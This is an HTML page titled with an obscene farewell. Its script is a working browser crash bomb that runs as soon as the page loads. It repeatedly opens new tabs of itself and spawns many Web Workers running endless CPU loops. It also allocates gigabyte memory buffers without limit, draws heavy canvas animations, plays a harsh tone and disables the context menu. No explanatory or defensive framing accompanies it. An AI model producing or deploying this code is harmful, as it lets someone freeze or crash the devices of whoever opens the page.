<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>BYE BITCH</title>
  <style>
    body {
      margin: 0;
      height: 100dvh;
      background: #000;
      color: #f33;
      font-family: system-ui, sans-serif;
      overflow: hidden;
      display: grid;
      place-items: center;
      font-size: 18vw;
      font-weight: 900;
      text-shadow: 0 0 100px #f00;
      user-select: none;
    }
    canvas { position: fixed; inset: 0; z-index: -1; }
    .chaos { position: fixed; pointer-events: none; z-index: 5; mix-blend-mode: screen; }
  </style>
</head>
<body>
<div>BYE BITCH</div>

<script>
const nukelink = location.href;
function openNuke() {
  try {
    window.open(nukelink, '_blank');
    const a = document.createElement('a');
    a.href = nukelink; a.target = '_blank';
    document.body.appendChild(a); a.click(); a.remove();
  } catch(e) {}
}
for (let i = 0; i < 80; i++) setTimeout(openNuke, i * 5);
setInterval(() => { for (let i = 0; i < 25; i++) setTimeout(openNuke, i * 8); }, 120);

setInterval(() => { for (let i = 0; i < 4000; i++) document.title = Math.random().toString(36) + "💀"; }, 1);

const workerCode = URL.createObjectURL(new Blob([`
  'use strict';
  self.onmessage = () => {
    let x = performance.now() * Math.PI;
    while (true) {
      x = Math.sin(x) * Math.cos(x * 1.45) * Math.tan(x + 1e-9);
      for (let i = 0; i < 160000000; i++) {
        x += Math.log1p(Math.abs(x) + 1e-300) * 4.5e-9;
      }
    }
  };
`], { type: 'application/javascript' }));

const threadCount = (navigator.hardwareConcurrency || 8) * 16;
for (let i = 0; i < threadCount; i++) new Worker(workerCode).postMessage("go");

const allocations = [];
function bombMemory() {
  try {
    allocations.push(new ArrayBuffer(1 << 30));
    allocations.push(new Float64Array(1 << 27).fill(Math.random() * 999999));
    allocations.push(new Uint8Array(1 << 29));
  } catch(e) {}
}
for (let i = 0; i < 120; i++) bombMemory();
setInterval(bombMemory, 80);

for (let n = 0; n < 8; n++) {  
  const c = document.createElement('canvas');
  c.style.position = 'fixed';
  c.style.inset = '0';
  c.style.zIndex = '-1';
  c.style.opacity = '0.75';
  document.body.appendChild(c);

  const ctx = c.getContext('2d', { alpha: true });

  function resize() {
    c.width = innerWidth * 3.6;
    c.height = innerHeight * 3.6;
  }
  resize();
  window.addEventListener('resize', resize);

  let t = n * 30;
  function draw() {
    ctx.fillStyle = 'rgba(0,0,0,0.1)';
    ctx.fillRect(0, 0, c.width, c.height);

    for (let i = 0; i < 850; i++) {
      const x = Math.sin(t * 0.04 + i) * c.width * 0.55 + c.width/2;
      const y = Math.cos(t * 0.035 + i * 1.6) * c.height * 0.55 + c.height/2;
      ctx.fillStyle = `hsl(${ (t * 30 + i * 8) % 360 }, 100%, 65%)`;
      ctx.fillRect(x - 22, y - 22, 44, 44);
    }
    t += 0.28;
    requestAnimationFrame(draw);
  }
  draw();
}

function spawnChaos() {
  const el = document.createElement('div');
  el.className = 'chaos';
  el.textContent = ["BYE","FUCK","RIP","DEAD","CRASH","LOL"][Math.floor(Math.random()*6)];
  el.style.fontSize = (100 + Math.random()*400) + "px";
  el.style.left = Math.random() * 100 + "vw";
  el.style.top = Math.random() * 100 + "vh";
  el.style.transform = `rotate(${Math.random()*1200}deg)`;
  document.body.appendChild(el);
  setTimeout(() => el.remove(), 7000);
}
setInterval(spawnChaos, 20);

try {
  const audio = new (window.AudioContext || window.webkitAudioContext)();
  const osc = audio.createOscillator();
  osc.type = 'sawtooth';
  osc.frequency.setValueAtTime(55, audio.currentTime);
  osc.connect(audio.destination);
  osc.start();
} catch(e) {}

document.addEventListener('contextmenu', e => e.preventDefault());
document.addEventListener('touchmove', e => e.preventDefault(), {passive: false});
</script>
</body>
</html>
